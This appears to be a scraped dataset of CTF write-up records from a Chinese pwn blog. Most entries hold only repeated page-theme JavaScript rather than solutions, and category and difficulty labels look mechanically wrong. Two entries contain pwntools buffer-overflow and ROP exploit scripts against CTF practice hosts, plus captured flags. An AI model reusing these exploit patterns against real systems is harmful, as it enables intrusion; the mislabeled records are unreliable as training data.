@@ -1,0 +1,214 @@
+[
+  {
+    "case_id": "NSSCTF_2024_144f270bc8a16f9a",
+    "title": "标签 - CTF",
+    "category": "网络取证",
+    "competition": "NSSCTF",
+    "year": 2024,
+    "difficulty": "hard",
+    "tools_used": [],
+    "techniques": [],
+    "description": "标签 - CTF - 玫幽倩的小博客 var Fluid = window.Fluid || {}; Fluid.ctx = Object.assign({}, Fluid.ctx) var CONFIG = {\"hostname\":\"mei-you-qian.github.io\",\"root\":\"/\",\"version\":\"1.9.8\",\"typing\":{\"enable\":true,\"typeSpeed\":70,\"cursorChar\":\"_\",\"loop\":false,\"scope\":[]},\"anchorjs\":{\"enable\":true,\"element\":\"h1,h2,h3,h4",
+    "solution_steps": [
+      "标签 - CTF - 玫幽倩的小博客\n\n  \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n  \n    \n  \n\n\n\n  \n\n\n\n\n\n\n\n\n  \n    var Fluid = window.Fluid || {};\n    Fluid.ctx = Object.assign({}, Fluid.ctx)\n    var CONFIG = {\"hostname\":\"mei-you-qian.github.io\",\"root\":\"/\",\"version\":\"1.9.8\",\"typing\":{\"enable\":true,\"typeSpeed\":70,\"cursorChar\":\"_\",\"loop\":false,\"scope\":[]},\"anchorjs\":{\"enable\":true,\"element\":\"h1,h2,h3,h4,h5,h6\",\"placement\":\"left\",\"visible\":\"hover\",\"icon\":\"\"},\"progressbar\":{\"enable\":true,\"height_px\":3,\"color\":\"#29d\",\"options\":{\"showSpinner\":false,\"trickleSpeed\":100}},\"code_language\":{\"enable\":true,\"default\":\"TEXT\"},\"copy_btn\":true,\"image_caption\":{\"enable\":true},\"image_zoom\":{\"enable\":true,\"img_url_replace\":[\"\",\"\"]},\"toc\":{\"enable\":true,\"placement\":\"right\",\"headingSelector\":\"h1,h2,h3,h4,h5,h6\",\"collapseDepth\":0},\"lazyload\":{\"enable\":true,\"loading_img\":\"/img/loading.gif\",\"onlypost\":false,\"offset_factor\":2},\"web_analytics\":{\"enable\":false,\"follow_dnt\":true,\"baidu\":null,\"google\":{\"measurement_id\":null},\"tencent\":{\"sid\":null,\"cid\":null},\"leancloud\":{\"app_id\":null,\"app_key\":null,\"server_url\":null,\"path\":\"window.location.pathname\",\"ignore_local\":false},\"umami\":{\"src\":null,\"website_id\":null,\"domains\":null,\"start_time\":\"2024-01-01T00:00:00.000Z\",\"token\":null,\"api_server\":null}},\"search_path\":\"/local-search.xml\",\"include_content_in_search\":true};\n\n    if (CONFIG.web_analytics.follow_dnt) {\n      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;\n      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));\n    }\n  \n  \n  \n  \n\n\n  \n\n\n\n\n  \n\n  \n    \n\n\n  \n  \n    \n      玫幽倩\n    \n\n    \n      \n    \n\n    \n    \n      \n        \n          \n          \n          \n          \n            \n              \n                \n                首页"
+    ],
+    "key_findings": [],
+    "flags": [],
+    "tags": [
+      "网络取证",
+      "Writeup",
+      "CTF"
+    ],
+    "content_hash": "144f270bc8a16f9a",
+    "source_url": "https://mei-you-qian.github.io/tags/CTF/index"
+  },
+  {
+    "case_id": "NSSCTF_2024_164443e35d935675",
+    "title": "标签 - Pwn",
+    "category": "网络取证",
+    "competition": "NSSCTF",
+    "year": 2024,
+    "difficulty": "hard",
+    "tools_used": [],
+    "techniques": [],
+    "description": "标签 - Pwn - 玫幽倩的小博客 var Fluid = window.Fluid || {}; Fluid.ctx = Object.assign({}, Fluid.ctx) var CONFIG = {\"hostname\":\"mei-you-qian.github.io\",\"root\":\"/\",\"version\":\"1.9.8\",\"typing\":{\"enable\":true,\"typeSpeed\":70,\"cursorChar\":\"_\",\"loop\":false,\"scope\":[]},\"anchorjs\":{\"enable\":true,\"element\":\"h1,h2,h3,h4",
+    "solution_steps": [
+      "标签 - Pwn - 玫幽倩的小博客\n\n  \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n  \n    \n  \n\n\n\n  \n\n\n\n\n\n\n\n\n  \n    var Fluid = window.Fluid || {};\n    Fluid.ctx = Object.assign({}, Fluid.ctx)\n    var CONFIG = {\"hostname\":\"mei-you-qian.github.io\",\"root\":\"/\",\"version\":\"1.9.8\",\"typing\":{\"enable\":true,\"typeSpeed\":70,\"cursorChar\":\"_\",\"loop\":false,\"scope\":[]},\"anchorjs\":{\"enable\":true,\"element\":\"h1,h2,h3,h4,h5,h6\",\"placement\":\"left\",\"visible\":\"hover\",\"icon\":\"\"},\"progressbar\":{\"enable\":true,\"height_px\":3,\"color\":\"#29d\",\"options\":{\"showSpinner\":false,\"trickleSpeed\":100}},\"code_language\":{\"enable\":true,\"default\":\"TEXT\"},\"copy_btn\":true,\"image_caption\":{\"enable\":true},\"image_zoom\":{\"enable\":true,\"img_url_replace\":[\"\",\"\"]},\"toc\":{\"enable\":true,\"placement\":\"right\",\"headingSelector\":\"h1,h2,h3,h4,h5,h6\",\"collapseDepth\":0},\"lazyload\":{\"enable\":true,\"loading_img\":\"/img/loading.gif\",\"onlypost\":false,\"offset_factor\":2},\"web_analytics\":{\"enable\":false,\"follow_dnt\":true,\"baidu\":null,\"google\":{\"measurement_id\":null},\"tencent\":{\"sid\":null,\"cid\":null},\"leancloud\":{\"app_id\":null,\"app_key\":null,\"server_url\":null,\"path\":\"window.location.pathname\",\"ignore_local\":false},\"umami\":{\"src\":null,\"website_id\":null,\"domains\":null,\"start_time\":\"2024-01-01T00:00:00.000Z\",\"token\":null,\"api_server\":null}},\"search_path\":\"/local-search.xml\",\"include_content_in_search\":true};\n\n    if (CONFIG.web_analytics.follow_dnt) {\n      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;\n      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));\n    }\n  \n  \n  \n  \n\n\n  \n\n\n\n\n  \n\n  \n    \n\n\n  \n  \n    \n      玫幽倩\n    \n\n    \n      \n    \n\n    \n    \n      \n        \n          \n          \n          \n          \n            \n              \n                \n                首页"
+    ],
+    "key_findings": [],
+    "flags": [],
+    "tags": [
+      "网络取证",
+      "Writeup",
+      "CTF"
+    ],
+    "content_hash": "164443e35d935675",
+    "source_url": "https://mei-you-qian.github.io/tags/Pwn/index"
+  },
+  {
+    "case_id": "NSSCTF_2024_c58672e91363fb46",
+    "title": "标签 - Pwn",
+    "category": "网络取证",
+    "competition": "NSSCTF",
+    "year": 2024,
+    "difficulty": "hard",
+    "tools_used": [],
+    "techniques": [],
+    "description": "标签 - Pwn - 玫幽倩的小博客 var Fluid = window.Fluid || {}; Fluid.ctx = Object.assign({}, Fluid.ctx) var CONFIG = {\"hostname\":\"mei-you-qian.github.io\",\"root\":\"/\",\"version\":\"1.9.8\",\"typing\":{\"enable\":true,\"typeSpeed\":70,\"cursorChar\":\"_\",\"loop\":false,\"scope\":[]},\"anchorjs\":{\"enable\":true,\"element\":\"h1,h2,h3,h4",
+    "solution_steps": [
+      "标签 - Pwn - 玫幽倩的小博客\n\n  \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n  \n    \n  \n\n\n\n  \n\n\n\n\n\n\n\n\n  \n    var Fluid = window.Fluid || {};\n    Fluid.ctx = Object.assign({}, Fluid.ctx)\n    var CONFIG = {\"hostname\":\"mei-you-qian.github.io\",\"root\":\"/\",\"version\":\"1.9.8\",\"typing\":{\"enable\":true,\"typeSpeed\":70,\"cursorChar\":\"_\",\"loop\":false,\"scope\":[]},\"anchorjs\":{\"enable\":true,\"element\":\"h1,h2,h3,h4,h5,h6\",\"placement\":\"left\",\"visible\":\"hover\",\"icon\":\"\"},\"progressbar\":{\"enable\":true,\"height_px\":3,\"color\":\"#29d\",\"options\":{\"showSpinner\":false,\"trickleSpeed\":100}},\"code_language\":{\"enable\":true,\"default\":\"TEXT\"},\"copy_btn\":true,\"image_caption\":{\"enable\":true},\"image_zoom\":{\"enable\":true,\"img_url_replace\":[\"\",\"\"]},\"toc\":{\"enable\":true,\"placement\":\"right\",\"headingSelector\":\"h1,h2,h3,h4,h5,h6\",\"collapseDepth\":0},\"lazyload\":{\"enable\":true,\"loading_img\":\"/img/loading.gif\",\"onlypost\":false,\"offset_factor\":2},\"web_analytics\":{\"enable\":false,\"follow_dnt\":true,\"baidu\":null,\"google\":{\"measurement_id\":null},\"tencent\":{\"sid\":null,\"cid\":null},\"leancloud\":{\"app_id\":null,\"app_key\":null,\"server_url\":null,\"path\":\"window.location.pathname\",\"ignore_local\":false},\"umami\":{\"src\":null,\"website_id\":null,\"domains\":null,\"start_time\":\"2024-01-01T00:00:00.000Z\",\"token\":null,\"api_server\":null}},\"search_path\":\"/local-search.xml\",\"include_content_in_search\":true};\n\n    if (CONFIG.web_analytics.follow_dnt) {\n      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;\n      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));\n    }\n  \n  \n  \n  \n\n\n  \n\n\n\n\n  \n\n  \n    \n\n\n  \n  \n    \n      玫幽倩\n    \n\n    \n      \n    \n\n    \n    \n      \n        \n          \n          \n          \n          \n            \n              \n                \n                首页"
+    ],
+    "key_findings": [],
+    "flags": [],
+    "tags": [
+      "网络取证",
+      "Writeup",
+      "CTF"
+    ],
+    "content_hash": "c58672e91363fb46",
+    "source_url": "https://mei-you-qian.github.io/tags/Pwn/page/2/index"
+  },
+  {
+    "case_id": "NSSCTF_2024_1dce1c04e464c775",
+    "title": "分类 - CTF",
+    "category": "网络取证",
+    "competition": "NSSCTF",
+    "year": 2024,
+    "difficulty": "hard",
+    "tools_used": [],
+    "techniques": [],
+    "description": "分类 - CTF - 玫幽倩的小博客 var Fluid = window.Fluid || {}; Fluid.ctx = Object.assign({}, Fluid.ctx) var CONFIG = {\"hostname\":\"mei-you-qian.github.io\",\"root\":\"/\",\"version\":\"1.9.8\",\"typing\":{\"enable\":true,\"typeSpeed\":70,\"cursorChar\":\"_\",\"loop\":false,\"scope\":[]},\"anchorjs\":{\"enable\":true,\"element\":\"h1,h2,h3,h4",
+    "solution_steps": [
+      "分类 - CTF - 玫幽倩的小博客\n\n  \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n  \n    \n  \n\n\n\n  \n\n\n\n\n\n\n\n\n  \n    var Fluid = window.Fluid || {};\n    Fluid.ctx = Object.assign({}, Fluid.ctx)\n    var CONFIG = {\"hostname\":\"mei-you-qian.github.io\",\"root\":\"/\",\"version\":\"1.9.8\",\"typing\":{\"enable\":true,\"typeSpeed\":70,\"cursorChar\":\"_\",\"loop\":false,\"scope\":[]},\"anchorjs\":{\"enable\":true,\"element\":\"h1,h2,h3,h4,h5,h6\",\"placement\":\"left\",\"visible\":\"hover\",\"icon\":\"\"},\"progressbar\":{\"enable\":true,\"height_px\":3,\"color\":\"#29d\",\"options\":{\"showSpinner\":false,\"trickleSpeed\":100}},\"code_language\":{\"enable\":true,\"default\":\"TEXT\"},\"copy_btn\":true,\"image_caption\":{\"enable\":true},\"image_zoom\":{\"enable\":true,\"img_url_replace\":[\"\",\"\"]},\"toc\":{\"enable\":true,\"placement\":\"right\",\"headingSelector\":\"h1,h2,h3,h4,h5,h6\",\"collapseDepth\":0},\"lazyload\":{\"enable\":true,\"loading_img\":\"/img/loading.gif\",\"onlypost\":false,\"offset_factor\":2},\"web_analytics\":{\"enable\":false,\"follow_dnt\":true,\"baidu\":null,\"google\":{\"measurement_id\":null},\"tencent\":{\"sid\":null,\"cid\":null},\"leancloud\":{\"app_id\":null,\"app_key\":null,\"server_url\":null,\"path\":\"window.location.pathname\",\"ignore_local\":false},\"umami\":{\"src\":null,\"website_id\":null,\"domains\":null,\"start_time\":\"2024-01-01T00:00:00.000Z\",\"token\":null,\"api_server\":null}},\"search_path\":\"/local-search.xml\",\"include_content_in_search\":true};\n\n    if (CONFIG.web_analytics.follow_dnt) {\n      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;\n      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));\n    }\n  \n  \n  \n  \n\n\n  \n\n\n\n\n  \n\n  \n    \n\n\n  \n  \n    \n      玫幽倩\n    \n\n    \n      \n    \n\n    \n    \n      \n        \n          \n          \n          \n          \n            \n              \n                \n                首页"
+    ],
+    "key_findings": [],
+    "flags": [],
+    "tags": [
+      "网络取证",
+      "Writeup",
+      "CTF"
+    ],
+    "content_hash": "1dce1c04e464c775",
+    "source_url": "https://mei-you-qian.github.io/categories/CTF/index"
+  },
+  {
+    "case_id": "NSSCTF_2024_e87261eb74fb5681",
+    "title": "分类 - CTF",
+    "category": "网络取证",
+    "competition": "NSSCTF",
+    "year": 2024,
+    "difficulty": "hard",
+    "tools_used": [],
+    "techniques": [],
+    "description": "分类 - CTF - 玫幽倩的小博客 var Fluid = window.Fluid || {}; Fluid.ctx = Object.assign({}, Fluid.ctx) var CONFIG = {\"hostname\":\"mei-you-qian.github.io\",\"root\":\"/\",\"version\":\"1.9.8\",\"typing\":{\"enable\":true,\"typeSpeed\":70,\"cursorChar\":\"_\",\"loop\":false,\"scope\":[]},\"anchorjs\":{\"enable\":true,\"element\":\"h1,h2,h3,h4",
+    "solution_steps": [
+      "分类 - CTF - 玫幽倩的小博客\n\n  \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n  \n    \n  \n\n\n\n  \n\n\n\n\n\n\n\n\n  \n    var Fluid = window.Fluid || {};\n    Fluid.ctx = Object.assign({}, Fluid.ctx)\n    var CONFIG = {\"hostname\":\"mei-you-qian.github.io\",\"root\":\"/\",\"version\":\"1.9.8\",\"typing\":{\"enable\":true,\"typeSpeed\":70,\"cursorChar\":\"_\",\"loop\":false,\"scope\":[]},\"anchorjs\":{\"enable\":true,\"element\":\"h1,h2,h3,h4,h5,h6\",\"placement\":\"left\",\"visible\":\"hover\",\"icon\":\"\"},\"progressbar\":{\"enable\":true,\"height_px\":3,\"color\":\"#29d\",\"options\":{\"showSpinner\":false,\"trickleSpeed\":100}},\"code_language\":{\"enable\":true,\"default\":\"TEXT\"},\"copy_btn\":true,\"image_caption\":{\"enable\":true},\"image_zoom\":{\"enable\":true,\"img_url_replace\":[\"\",\"\"]},\"toc\":{\"enable\":true,\"placement\":\"right\",\"headingSelector\":\"h1,h2,h3,h4,h5,h6\",\"collapseDepth\":0},\"lazyload\":{\"enable\":true,\"loading_img\":\"/img/loading.gif\",\"onlypost\":false,\"offset_factor\":2},\"web_analytics\":{\"enable\":false,\"follow_dnt\":true,\"baidu\":null,\"google\":{\"measurement_id\":null},\"tencent\":{\"sid\":null,\"cid\":null},\"leancloud\":{\"app_id\":null,\"app_key\":null,\"server_url\":null,\"path\":\"window.location.pathname\",\"ignore_local\":false},\"umami\":{\"src\":null,\"website_id\":null,\"domains\":null,\"start_time\":\"2024-01-01T00:00:00.000Z\",\"token\":null,\"api_server\":null}},\"search_path\":\"/local-search.xml\",\"include_content_in_search\":true};\n\n    if (CONFIG.web_analytics.follow_dnt) {\n      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;\n      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));\n    }\n  \n  \n  \n  \n\n\n  \n\n\n\n\n  \n\n  \n    \n\n\n  \n  \n    \n      玫幽倩\n    \n\n    \n      \n    \n\n    \n    \n      \n        \n          \n          \n          \n          \n            \n              \n                \n                首页"
+    ],
+    "key_findings": [],
+    "flags": [],
+    "tags": [
+      "网络取证",
+      "Writeup",
+      "CTF"
+    ],
+    "content_hash": "e87261eb74fb5681",
+    "source_url": "https://mei-you-qian.github.io/categories/CTF/page/2/index"
+  },
+  {
+    "case_id": "NSSCTF_2026_474da16b56d8af21",
+    "title": "归档",
+    "category": "网络取证",
+    "competition": "NSSCTF",
+    "year": 2026,
+    "difficulty": "hard",
+    "tools_used": [],
+    "techniques": [],
+    "description": "归档 - 玫幽倩的小博客 var Fluid = window.Fluid || {}; Fluid.ctx = Object.assign({}, Fluid.ctx) var CONFIG = {\"hostname\":\"mei-you-qian.github.io\",\"root\":\"/\",\"version\":\"1.9.8\",\"typing\":{\"enable\":true,\"typeSpeed\":70,\"cursorChar\":\"_\",\"loop\":false,\"scope\":[]},\"anchorjs\":{\"enable\":true,\"element\":\"h1,h2,h3,h4,h5,h6",
+    "solution_steps": [
+      "归档 - 玫幽倩的小博客\n\n  \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n  \n    \n  \n\n\n\n  \n\n\n\n\n\n\n\n\n  \n    var Fluid = window.Fluid || {};\n    Fluid.ctx = Object.assign({}, Fluid.ctx)\n    var CONFIG = {\"hostname\":\"mei-you-qian.github.io\",\"root\":\"/\",\"version\":\"1.9.8\",\"typing\":{\"enable\":true,\"typeSpeed\":70,\"cursorChar\":\"_\",\"loop\":false,\"scope\":[]},\"anchorjs\":{\"enable\":true,\"element\":\"h1,h2,h3,h4,h5,h6\",\"placement\":\"left\",\"visible\":\"hover\",\"icon\":\"\"},\"progressbar\":{\"enable\":true,\"height_px\":3,\"color\":\"#29d\",\"options\":{\"showSpinner\":false,\"trickleSpeed\":100}},\"code_language\":{\"enable\":true,\"default\":\"TEXT\"},\"copy_btn\":true,\"image_caption\":{\"enable\":true},\"image_zoom\":{\"enable\":true,\"img_url_replace\":[\"\",\"\"]},\"toc\":{\"enable\":true,\"placement\":\"right\",\"headingSelector\":\"h1,h2,h3,h4,h5,h6\",\"collapseDepth\":0},\"lazyload\":{\"enable\":true,\"loading_img\":\"/img/loading.gif\",\"onlypost\":false,\"offset_factor\":2},\"web_analytics\":{\"enable\":false,\"follow_dnt\":true,\"baidu\":null,\"google\":{\"measurement_id\":null},\"tencent\":{\"sid\":null,\"cid\":null},\"leancloud\":{\"app_id\":null,\"app_key\":null,\"server_url\":null,\"path\":\"window.location.pathname\",\"ignore_local\":false},\"umami\":{\"src\":null,\"website_id\":null,\"domains\":null,\"start_time\":\"2024-01-01T00:00:00.000Z\",\"token\":null,\"api_server\":null}},\"search_path\":\"/local-search.xml\",\"include_content_in_search\":true};\n\n    if (CONFIG.web_analytics.follow_dnt) {\n      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;\n      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));\n    }\n  \n  \n  \n  \n\n\n  \n\n\n\n\n  \n\n  \n    \n\n\n  \n  \n    \n      玫幽倩\n    \n\n    \n      \n    \n\n    \n    \n      \n        \n          \n          \n          \n          \n            \n              \n                \n                首页"
+    ],
+    "key_findings": [],
+    "flags": [],
+    "tags": [
+      "网络取证",
+      "Writeup",
+      "CTF"
+    ],
+    "content_hash": "474da16b56d8af21",
+    "source_url": "https://mei-you-qian.github.io/archives/2026/04/index"
+  },
+  {
+    "case_id": "NSSCTF_2026_cf78b66b6d368a98",
+    "title": "2025-SWPU-NSSCTF(Pwn全)",
+    "category": "网络取证",
+    "competition": "NSSCTF",
+    "year": 2026,
+    "difficulty": "hard",
+    "tools_used": [],
+    "techniques": [],
+    "description": "2025-SWPU-NSSCTF(Pwn全) - 玫幽倩的小博客 var Fluid = window.Fluid || {}; Fluid.ctx = Object.assign({}, Fluid.ctx) var CONFIG = {\"hostname\":\"mei-you-qian.github.io\",\"root\":\"/\",\"version\":\"1.9.8\",\"typing\":{\"enable\":true,\"typeSpeed\":70,\"cursorChar\":\"_\",\"loop\":false,\"scope\":[]},\"anchorjs\":{\"enable\":true,\"element",
+    "solution_steps": [
+      "2025-SWPU-NSSCTF(Pwn全) - 玫幽倩的小博客\n\n  \n\n\n\n  \n\n  \n\n  \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n  \n    \n  \n\n\n\n  \n\n\n\n\n\n\n\n\n  \n    var Fluid = window.Fluid || {};\n    Fluid.ctx = Object.assign({}, Fluid.ctx)\n    var CONFIG = {\"hostname\":\"mei-you-qian.github.io\",\"root\":\"/\",\"version\":\"1.9.8\",\"typing\":{\"enable\":true,\"typeSpeed\":70,\"cursorChar\":\"_\",\"loop\":false,\"scope\":[]},\"anchorjs\":{\"enable\":true,\"element\":\"h1,h2,h3,h4,h5,h6\",\"placement\":\"left\",\"visible\":\"hover\",\"icon\":\"\"},\"progressbar\":{\"enable\":true,\"height_px\":3,\"color\":\"#29d\",\"options\":{\"showSpinner\":false,\"trickleSpeed\":100}},\"code_language\":{\"enable\":true,\"default\":\"TEXT\"},\"copy_btn\":true,\"image_caption\":{\"enable\":true},\"image_zoom\":{\"enable\":true,\"img_url_replace\":[\"\",\"\"]},\"toc\":{\"enable\":true,\"placement\":\"right\",\"headingSelector\":\"h1,h2,h3,h4,h5,h6\",\"collapseDepth\":0},\"lazyload\":{\"enable\":true,\"loading_img\":\"/img/loading.gif\",\"onlypost\":false,\"offset_factor\":2},\"web_analytics\":{\"enable\":false,\"follow_dnt\":true,\"baidu\":null,\"google\":{\"measurement_id\":null},\"tencent\":{\"sid\":null,\"cid\":null},\"leancloud\":{\"app_id\":null,\"app_key\":null,\"server_url\":null,\"path\":\"window.location.pathname\",\"ignore_local\":false},\"umami\":{\"src\":null,\"website_id\":null,\"domains\":null,\"start_time\":\"2024-01-01T00:00:00.000Z\",\"token\":null,\"api_server\":null}},\"search_path\":\"/local-search.xml\",\"include_content_in_search\":true};\n\n    if (CONFIG.web_analytics.follow_dnt) {\n      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;\n      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));\n    }\n  \n  \n  \n  \n\n\n  \n\n\n\n\n  \n\n  \n    \n\n\n  \n  \n    \n      玫幽倩\n    \n\n    \n      \n    \n\n    \n    \n      \n        \n          \n          \n          \n          \n            \n              \n                \n                首页"
+    ],
+    "key_findings": [
+      "from pwn import *context.log_level = &quot;debug&quot;io=remote(&quot;node4.anna.nssctf.cn&quot;,28447)padding=0x10+8rdi = 0x04005e3ret = 0x0400416system = 0x400430sh = 0x400541payload = b&quot;a&quot;*padding +p64(rdi)+p64(sh)+p64(ret)+p64(system)io.sendline(payload)io.interactive()",
+      "from pwn import *context.log_level = &quot;debug&quot;io=remote(&quot;node5.anna.nssctf.cn&quot;,29705)padding=0x20+8backdoor=0x401196payload = b&quot;a&quot;*padding +p64(backdoor)io.sendline(payload)io.interactive()",
+      "from pwn import *context.log_level = &quot;debug&quot;io=remote(&quot;node7.anna.nssctf.cn&quot;,27715)padding=0x28+4main_now = io.recvuntil(&#x27;70&#x27;)[-10:]main_addr = int(main_now,16)payload=b&quot;a&quot;*padding+p32(main_addr+0x9F)io.sendline(payload)io.interactive()",
+      "ROPgadget --binary service  --string &#x27;/bin/sh&#x27;ROPgadget --binary service  --string &#x27;sh&#x27;",
+      "from pwn import *context.log_level = &quot;debug&quot;io=remote(&quot;node5.anna.nssctf.cn&quot;,29307)padding=0x18+4system=0x08048529sh=0x08048670payload = b&quot;a&quot;*padding+p32(system)+p32(sh)io.sendline(payload)io.interactive()"
+    ],
+    "flags": [
+      "CTF{2ef7ead1-9abc-4d8e-bce4-87ecfebe3453}",
+      "CTF{64a18987-9d10-4bf1-81d0-a5d2a6a74d80}",
+      "CTF{64d636d0-6ca3-4d28-80de-5d383b93ba0e}",
+      "ctf{Yo0ur_ggddddb_1s_o00okkk!}",
+      "ctf{L3arn_R0p_1s_3@5y_but_k33p_is_c00l}",
+      "CTF{d637db40-0b4e-45d9-bda3-286d44f6654c}",
+      "ctf{Never_giv3_up!!Chall3nge_y0urs31f!!}",
+      "CTF{b094eec7-ea92-4af1-b5e0-90b830ff48fe}",
+      "CTF{4e2ebb16-becf-492a-a3cb-208e5d458076}",
+      "CTF{02f1ff7b-26c3-4cbb-91d4-878d66569199}",
+      "CTF{8930b5a3-1c2c-43d6-be61-c87442002c80}",
+      "CTF{baby_arr@yxxxx}",
+      "CTF{649095a2-cd59-4c3d-b7d8-0ee0f1f70378}",
+      "CTF{ec587bbc-a20b-4723-9463-50e297ea95b4}",
+      "ctf{W@rn1ng,Sh31lc0de_inj3ct3r!!!}"
+    ],
+    "tags": [
+      "网络取证",
+      "Writeup",
+      "CTF"
+    ],
+    "content_hash": "cf78b66b6d368a98",
+    "source_url": "https://mei-you-qian.github.io/2026/04/21/2025-SWPU-NSSCTF(Pwn全)/index"
+  },
+  {
+    "case_id": "NSSCTF_2026_ad47b4ff587a8153",
+    "title": "CTFshow-Pwn入门Bypass安全机制(111-120))",
+    "category": "网络取证",
+    "competition": "NSSCTF",
+    "year": 2026,
+    "difficulty": "hard",
+    "tools_used": [],
+    "techniques": [],
+    "description": "CTFshow-Pwn入门Bypass安全机制(111-120)) - 玫幽倩的小博客 var Fluid = window.Fluid || {}; Fluid.ctx = Object.assign({}, Fluid.ctx) var CONFIG = {\"hostname\":\"mei-you-qian.github.io\",\"root\":\"/\",\"version\":\"1.9.8\",\"typing\":{\"enable\":true,\"typeSpeed\":70,\"cursorChar\":\"_\",\"loop\":false,\"scope\":[]},\"anchorjs\":{\"enable\":tr",
+    "solution_steps": [
+      "CTFshow-Pwn入门Bypass安全机制(111-120)) - 玫幽倩的小博客\n\n  \n\n\n\n  \n\n  \n\n  \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n  \n    \n  \n\n\n\n  \n\n\n\n\n\n\n\n\n  \n    var Fluid = window.Fluid || {};\n    Fluid.ctx = Object.assign({}, Fluid.ctx)\n    var CONFIG = {\"hostname\":\"mei-you-qian.github.io\",\"root\":\"/\",\"version\":\"1.9.8\",\"typing\":{\"enable\":true,\"typeSpeed\":70,\"cursorChar\":\"_\",\"loop\":false,\"scope\":[]},\"anchorjs\":{\"enable\":true,\"element\":\"h1,h2,h3,h4,h5,h6\",\"placement\":\"left\",\"visible\":\"hover\",\"icon\":\"\"},\"progressbar\":{\"enable\":true,\"height_px\":3,\"color\":\"#29d\",\"options\":{\"showSpinner\":false,\"trickleSpeed\":100}},\"code_language\":{\"enable\":true,\"default\":\"TEXT\"},\"copy_btn\":true,\"image_caption\":{\"enable\":true},\"image_zoom\":{\"enable\":true,\"img_url_replace\":[\"\",\"\"]},\"toc\":{\"enable\":true,\"placement\":\"right\",\"headingSelector\":\"h1,h2,h3,h4,h5,h6\",\"collapseDepth\":0},\"lazyload\":{\"enable\":true,\"loading_img\":\"/img/loading.gif\",\"onlypost\":false,\"offset_factor\":2},\"web_analytics\":{\"enable\":false,\"follow_dnt\":true,\"baidu\":null,\"google\":{\"measurement_id\":null},\"tencent\":{\"sid\":null,\"cid\":null},\"leancloud\":{\"app_id\":null,\"app_key\":null,\"server_url\":null,\"path\":\"window.location.pathname\",\"ignore_local\":false},\"umami\":{\"src\":null,\"website_id\":null,\"domains\":null,\"start_time\":\"2024-01-01T00:00:00.000Z\",\"token\":null,\"api_server\":null}},\"search_path\":\"/local-search.xml\",\"include_content_in_search\":true};\n\n    if (CONFIG.web_analytics.follow_dnt) {\n      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;\n      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));\n    }\n  \n  \n  \n  \n\n\n  \n\n\n\n\n  \n\n  \n    \n\n\n  \n  \n    \n      玫幽倩\n    \n\n    \n      \n    \n\n    \n    \n      \n        \n          \n          \n          \n          \n            \n              \n                \n                首页"
+    ],
+    "key_findings": [
+      "from pwn import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28112)offset = 0x80+8do_global = 0x400697payload = b&#x27;a&#x27;*offset + p64(do_global)io.sendline(payload)io.interactive()",
+      "from pwn import *context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28234)payload = p32(0x11)*0xeio.sendline(payload)io.interactive()",
+      "v8 = 0LL;while ( !feof(stdin) )&#123;  v7 = fgetc(stdin);  if ( v7 == 10 )    break;  v3 = v8++;  v6 = v3;  v5[v3] = v7;&#125;v5[v8] = 0;",
+      "sub     rsp, 420h",
+      "__int64 v3; // raxchar v5[1032]; // [rsp+0h] [rbp-420h] BYREF__int64 v6; // [rsp+408h] [rbp-18h]char v7; // [rsp+417h] [rbp-9h]__int64 v8; // [rsp+418h] [rbp-8h]"
+    ],
+    "flags": [],
+    "tags": [
+      "网络取证",
+      "Writeup",
+      "CTF"
+    ],
+    "content_hash": "ad47b4ff587a8153",
+    "source_url": "https://mei-you-qian.github.io/2026/04/10/Bypass安全机制/index"
+  }
+]
